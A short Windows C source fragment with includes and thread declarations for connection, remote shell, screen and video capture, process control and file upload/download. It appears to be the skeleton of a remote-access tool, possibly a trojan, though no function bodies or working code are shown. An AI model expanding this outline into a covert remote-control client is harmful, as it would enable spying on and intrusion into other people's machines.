#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

#include "FileOperator.h"
#include "SystemInfo.h"
#include "Process.h"
#include "DosShell.h"
#include "Command.h"

#include "XScreenXor.h"
#include "VideoCap.h"

#include "Functions.h"
#include "zconf.h"
#include "zlib.h"
#pragma comment(lib,"zlib.lib")	//图象无损数据压缩使用zlib库函数

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

DWORD _stdcall ConnectThread(LPVOID lParam);
DWORD _stdcall FileManageThread(LPVOID lParam);
DWORD _stdcall ScreenThread(LPVOID lParam);
DWORD _stdcall ProcessThread(LPVOID lParam);
DWORD _stdcall ShellThread(LPVOID lParam);
DWORD _stdcall VideoThread(LPVOID lParam);
DWORD _stdcall FileDownThread(LPVOID lParam);
DWORD _stdcall FileUpThread(LPVOID lParam);
